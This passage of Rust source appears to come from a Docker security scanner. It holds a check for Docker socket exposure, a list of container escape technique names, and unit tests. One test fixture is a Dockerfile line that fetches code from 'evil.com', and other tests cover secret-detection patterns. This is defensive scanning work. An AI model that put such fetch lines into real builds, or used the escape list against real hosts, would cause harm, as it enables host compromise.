                ),
                cwe: Some("CWE-250".to_string()),
                owasp: Some("A01:2021 - Broken Access Control".to_string()),
            });
        }

        report
    }

    /// Check for Docker socket access
    fn check_docker_socket_access(&self, path: &Path) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Path(path.to_path_buf()));

        // Search for Docker socket references in files
        let entries = WalkDir::new(path)
            .max_depth(5)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| !self.should_exclude(e.path()))
            .filter(|e| e.file_type().is_file());

        for entry in entries {
            let file_path = entry.path();
            let file_path_str = file_path.display().to_string();

            if let Ok(content) = fs::read_to_string(file_path) {
                let upper = content.to_uppercase();

                // Check for Docker socket mounts
                if upper.contains("DOCKER.SOCK") || upper.contains("/VAR/RUN/DOCKER") {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Critical,
                        title: "Docker Socket Exposed".to_string(),
                        description: "Docker socket is mounted or referenced. This provides complete \
                        control over the Docker daemon and can lead to container escape and host compromise.".to_string(),
                        location: Some(file_path_str.clone()),
                        recommendation: Some(
                            "Never mount Docker socket into containers. If Docker-in-Docker is required, \
                            use alternative approaches like Docker-outside-of-Docker (DooD) with proper \
                            isolation, or use rootless Docker."
                                .to_string(),
                        ),
                        cwe: Some("CWE-250".to_string()),
                        owasp: Some("A01:2021 - Broken Access Control".to_string()),
                    });
                }
            }
        }

        Ok(report)
    }

    /// Check if a path should be excluded from scanning
    fn should_exclude(&self, path: &Path) -> bool {
        path.components()
            .filter_map(|c| c.as_os_str().to_str())
            .any(|component| EXCLUDED_DIRS.contains(&component))
    }

    /// Get container escape techniques for reporting
    fn get_escape_techniques(&self) -> Vec<(&'static str, &'static str, VulnSeverity)> {
        vec![
            ("cgroup-release_agent", "Cgroup release_agent escape (requires CAP_SYS_ADMIN)", VulnSeverity::Critical),
            ("mount-device", "Mount host device for escape", VulnSeverity::Critical),
            ("docker-socket", "Docker socket mount for container breakout", VulnSeverity::Critical),
            ("proc-fs", "/proc filesystem escape via mount", VulnSeverity::High),
            ("sys-fs", "/sys filesystem escape via cgroup", VulnSeverity::High),
            ("runc-exploit", "runc CVE-2019-5736 escape", VulnSeverity::Critical),
            ("criu-exploit", "CRIU checkpoint escape", VulnSeverity::High),
            ("coredump-escape", "Core dump escape technique", VulnSeverity::Medium),
            ("fd-leak", "File descriptor leak escape", VulnSeverity::Medium),
            ("ptrace-escape", "Ptrace-based escape", VulnSeverity::High),
        ]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_docker_scanner_creation() {
        let config = ScannerConfig::new();
        let scanner = DockerScanner::new(config);
        assert_eq!(scanner.config.aggressive, false);
    }

    #[test]
    fn test_dockerfile_analysis_latest() {
        let config = ScannerConfig::new();
        let scanner = DockerScanner::new(config);

        let dockerfile = "FROM ubuntu:latest\nRUN apt-get update";
        let analysis = scanner.analyze_dockerfile(dockerfile, "Dockerfile");

        assert!(analysis.uses_latest);
        assert_eq!(analysis.base_image, Some("ubuntu:latest".to_string()));
    }

    #[test]
    fn test_dockerfile_analysis_root() {
        let config = ScannerConfig::new();
        let scanner = DockerScanner::new(config);

        let dockerfile = "FROM alpine:3.18\nRUN apk add nginx";
        let analysis = scanner.analyze_dockerfile(dockerfile, "Dockerfile");

        assert!(analysis.runs_as_root);
    }

    #[test]
    fn test_dockerfile_analysis_non_root() {
        let config = ScannerConfig::new();
        let scanner = DockerScanner::new(config);

        let dockerfile = "FROM alpine:3.18\nUSER nobody\nRUN echo 'test'";
        let analysis = scanner.analyze_dockerfile(dockerfile, "Dockerfile");

        assert!(!analysis.runs_as_root);
    }

    #[test]
    fn test_dockerfile_analysis_add() {
        let config = ScannerConfig::new();
        let scanner = DockerScanner::new(config);

        let dockerfile = "FROM alpine:3.18\nADD https://evil.com/app /app";
        let analysis = scanner.analyze_dockerfile(dockerfile, "Dockerfile");

        assert!(analysis.uses_add);
        assert!(analysis.copies_from_urls);
    }

    #[test]
    fn test_dangerous_capabilities() {
        assert!(DANGEROUS_CAPABILITIES.contains(&"CAP_SYS_ADMIN"));
        assert!(DANGEROUS_CAPABILITIES.contains(&"CAP_NET_ADMIN"));
        assert!(DANGEROUS_CAPABILITIES.contains(&"CAP_SYS_MODULE"));
    }

    #[test]
    fn test_sensitive_mount_paths() {
        let root_severity = SENSITIVE_MOUNT_PATHS
            .iter()
            .find(|(path, _)| *path == "/")
            .map(|(_, severity)| severity);

        assert_eq!(root_severity, Some(&VulnSeverity::Critical));

        let docker_sock_severity = SENSITIVE_MOUNT_PATHS
            .iter()
            .find(|(path, _)| *path == "/var/run/docker.sock")
            .map(|(_, severity)| severity);

        assert_eq!(docker_sock_severity, Some(&VulnSeverity::Critical));
    }

    #[test]
    fn test_should_exclude() {
        let config = ScannerConfig::new();
        let scanner = DockerScanner::new(config);

        assert!(scanner.should_exclude(Path::new("node_modules/test")));
        assert!(scanner.should_exclude(Path::new("target/test")));
        assert!(!scanner.should_exclude(Path::new("src/test")));
    }

    #[test]
    fn test_docker_secret_patterns() {
        assert!(!DOCKER_SECRET_PATTERNS.is_empty());
        assert!(DOCKER_SECRET_PATTERNS.iter().any(|(p, _)| p.contains("SECRET")));
        assert!(DOCKER_SECRET_PATTERNS.iter().any(|(p, _)| p.contains("PASSWORD")));
        assert!(DOCKER_SECRET_PATTERNS.iter().any(|(p, _)| p.contains("AKIA")));
    }
}
